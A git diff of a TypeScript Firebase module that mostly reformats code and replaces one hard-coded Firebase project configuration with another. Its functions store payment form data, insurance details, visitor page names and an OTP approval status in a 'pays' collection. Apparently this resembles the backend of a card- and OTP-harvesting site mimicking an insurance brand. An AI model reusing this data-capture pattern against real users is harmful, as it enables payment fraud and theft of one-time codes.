@@ -1,69 +1,80 @@
-import { getApp, getApps, initializeApp } from "firebase/app"
-import { Firestore, addDoc, collection, doc, getFirestore, setDoc, updateDoc } from "firebase/firestore"
-import { Offer } from "./types/offers"
-import { PaymentFormData } from "./types/payemnts"
-import { InsuranceFormData } from "./types/insurance"
+import { getApp, getApps, initializeApp } from "firebase/app";
+import {
+  Firestore,
+  addDoc,
+  collection,
+  doc,
+  getFirestore,
+  setDoc,
+  updateDoc,
+} from "firebase/firestore";
+import { Offer } from "./types/offers";
+import { PaymentFormData } from "./types/payemnts";
+import { InsuranceFormData } from "./types/insurance";
 
 const firebaseConfig = {
-   // TODO: Replace with your own Firebase project configuration
-  apiKey: "AIzaSyBjy50rWzFnGGXApGjJPvCVWSTEd1AAVSo",
-  authDomain: "bcare-ae52f.firebaseapp.com",
-  projectId: "bcare-ae52f",
-  storageBucket: "bcare-ae52f.firebasestorage.app",
-  messagingSenderId: "499327765670",
-  appId: "1:499327765670:web:9cc20b4a84cfef1467f867",
-  measurementId: "G-GDS53LT0H7"
-}
+  // TODO: Replace with your own Firebase project configuration
+  apiKey: "AIzaSyCcnipDnA4iUpB-p1vqBwDagbTypBrweKk",
+  authDomain: "becsrd-57035.firebaseapp.com",
+  projectId: "becsrd-57035",
+  storageBucket: "becsrd-57035.firebasestorage.app",
+  messagingSenderId: "372512212787",
+  appId: "1:372512212787:web:79973362c0ce649bc82046",
+  measurementId: "G-RG2766H5DY",
+};
 
 // Initialize Firebase - safely for Next.js (client-side only)
-let app
-let db: Firestore
+let app;
+let db: Firestore;
 
 if (typeof window !== "undefined") {
-  app = getApps().length > 0 ? getApp() : initializeApp(firebaseConfig)
-  db = getFirestore(app)
+  app = getApps().length > 0 ? getApp() : initializeApp(firebaseConfig);
+  db = getFirestore(app);
 }
-export async function updateStaute(_paymentStatus:string,id:string){
-  const docRef = doc(db, "pays", id)
+export async function updateStaute(_paymentStatus: string, id: string) {
+  const docRef = doc(db, "pays", id);
   await updateDoc(docRef, {
-paymentStatus:_paymentStatus
-  })
+    paymentStatus: _paymentStatus,
+  });
 }
 /**
  * Add an offer to Firestore
  */
 export async function addOffer(offer: Offer) {
-  if (typeof window === "undefined") return null
+  if (typeof window === "undefined") return null;
 
   try {
     // If we have an ID, use it, otherwise let Firestore generate one
     if (offer.id) {
-      const offerRef = doc(db, "offers", offer.id)
+      const offerRef = doc(db, "offers", offer.id);
       await setDoc(offerRef, {
         ...offer,
         createdAt: new Date().toISOString(),
-      })
-      console.log("Offer added with ID:", offer.id)
-      return offer.id
+      });
+      console.log("Offer added with ID:", offer.id);
+      return offer.id;
     } else {
       const offerRef = await addDoc(collection(db, "offers"), {
         ...offer,
         createdAt: new Date().toISOString(),
-      })
-      console.log("Offer added with ID:", offerRef.id)
-      return offerRef.id
+      });
+      console.log("Offer added with ID:", offerRef.id);
+      return offerRef.id;
     }
   } catch (error) {
-    console.error("Error adding offer:", error)
-    throw error
+    console.error("Error adding offer:", error);
+    throw error;
   }
 }
 
 /**
  * Add payment information to Firestore
  */
-export async function addPaymentInfo(paymentData: PaymentFormData, userId: string) {
-  if (typeof window === "undefined") return null
+export async function addPaymentInfo(
+  paymentData: PaymentFormData,
+  userId: string
+) {
+  if (typeof window === "undefined") return null;
 
   try {
     // Store payment info with the user ID as reference
@@ -71,28 +82,32 @@ export async function addPaymentInfo(paymentData: PaymentFormData, userId: strin
       ...paymentData,
       userId,
       createdAt: new Date().toISOString(),
-    })
+    });
 
-    console.log("Payment info added with ID:", paymentRef.id)
-    return paymentRef.id
+    console.log("Payment info added with ID:", paymentRef.id);
+    return paymentRef.id;
   } catch (error) {
-    console.error("Error adding payment info:", error)
-    throw error
+    console.error("Error adding payment info:", error);
+    throw error;
   }
 }
 
 export async function addData(data: any) {
-  if (typeof window === "undefined") return null
+  if (typeof window === "undefined") return null;
 
-  localStorage.setItem("visitor", data.id)
+  localStorage.setItem("visitor", data.id);
   try {
-    const docRef = doc(db, "pays", data.id!)
-    await setDoc(docRef, { createdDate: new Date().toISOString(), ...data }, { merge: true })
+    const docRef = doc(db, "pays", data.id!);
+    await setDoc(
+      docRef,
+      { createdDate: new Date().toISOString(), ...data },
+      { merge: true }
+    );
 
-    console.log("Document written with ID: ", docRef.id)
+    console.log("Document written with ID: ", docRef.id);
     // You might want to show a success message to the user here
   } catch (e) {
-    console.error("Error adding document: ", e)
+    console.error("Error adding document: ", e);
     // You might want to show an error message to the user here
   }
 }
@@ -100,18 +115,25 @@ export async function addData(data: any) {
 /**
  * Add insurance form data to Firestore
  */
-export const handleUpdatePage = async (newPagename: string,arPageName:string, id: string) => {
-  if (typeof window === "undefined") return null
+export const handleUpdatePage = async (
+  newPagename: string,
+  arPageName: string,
+  id: string
+) => {
+  if (typeof window === "undefined") return null;
 
-  const targetPost = doc(db, "pays", id)
+  const targetPost = doc(db, "pays", id);
   await updateDoc(targetPost, {
     pagename: newPagename,
-    arabicPageName:arPageName
-  })
-}
+    arabicPageName: arPageName,
+  });
+};
 
-export async function addInsuranceData(insuranceData: InsuranceFormData, userId: string) {
-  if (typeof window === "undefined") return null
+export async function addInsuranceData(
+  insuranceData: InsuranceFormData,
+  userId: string
+) {
+  if (typeof window === "undefined") return null;
 
   try {
     // Store insurance data with the user ID as reference
@@ -120,70 +142,73 @@ export async function addInsuranceData(insuranceData: InsuranceFormData, userId:
       userId,
       createdDate: new Date().toISOString(),
       status: "pending", // You can add a status field to track the insurance request
-    })
+    });
 
-    console.log("Insurance data added with ID:", insuranceRef.id)
-    return insuranceRef.id
+    console.log("Insurance data added with ID:", insuranceRef.id);
+    return insuranceRef.id;
   } catch (error) {
-    console.error("Error adding insurance data:", error)
-    throw error
+    console.error("Error adding insurance data:", error);
+    throw error;
   }
 }
 
-
 // Mock Firebase API for listenToDocument
-type DocumentListener = (data: any | null) => void
+type DocumentListener = (data: any | null) => void;
 
-export const listenToDocument = (id: string, callback: DocumentListener): (() => void) => {
-  if (typeof window === "undefined") return () => {}
+export const listenToDocument = (
+  id: string,
+  callback: DocumentListener
+): (() => void) => {
+  if (typeof window === "undefined") return () => {};
 
-  console.log("Setting up real-time listener for document:", id)
+  console.log("Setting up real-time listener for document:", id);
 
   // Simulate onSnapshot behavior
-  let active = true
+  let active = true;
 
   // Initial callback with no data
   setTimeout(() => {
-    if (active) callback(null)
-  }, 500)
+    if (active) callback(null);
+  }, 500);
 
   // Simulate data changes
   const interval = setInterval(() => {
-    if (!active) return
+    if (!active) return;
 
     // Randomly decide if we should send an update
-    const shouldUpdate = Math.random() > 0.7
+    const shouldUpdate = Math.random() > 0.7;
 
     if (shouldUpdate) {
       // Randomly choose between approved, rejected, or no status yet
-      const statuses = ["approved", "rejected", null, null, null]
-      const randomStatus = statuses[Math.floor(Math.random() * statuses.length)]
+      const statuses = ["approved", "rejected", null, null, null];
+      const randomStatus =
+        statuses[Math.floor(Math.random() * statuses.length)];
 
       if (randomStatus) {
         callback({
           id,
           otpPhoneStatus: randomStatus,
           createdDate: new Date().toISOString(),
-        })
+        });
       } else {
-        callback({ id })
+        callback({ id });
       }
     }
-  }, 2000) // Check every 2 seconds
+  }, 2000); // Check every 2 seconds
 
   // Return unsubscribe function
   return () => {
-    active = false
-    clearInterval(interval)
-    console.log("Unsubscribed from document listener:", id)
-  }
-}
+    active = false;
+    clearInterval(interval);
+    console.log("Unsubscribed from document listener:", id);
+  };
+};
 
 // Get document by ID from Firestore (kept for backward compatibility)
 export const getDocumentById = async (id: string): Promise<any | null> => {
-  if (typeof window === "undefined") return null
+  if (typeof window === "undefined") return null;
 
-  console.log("Getting document from Firestore with ID:", id)
+  console.log("Getting document from Firestore with ID:", id);
 
   // Simulate API call
   return new Promise((resolve) => {
@@ -191,10 +216,9 @@ export const getDocumentById = async (id: string): Promise<any | null> => {
       resolve({
         id,
         createdDate: new Date().toISOString(),
-      })
-    }, 500)
-  })
-}
+      });
+    }, 500);
+  });
+};
 
-export { db }
-
+export { db };
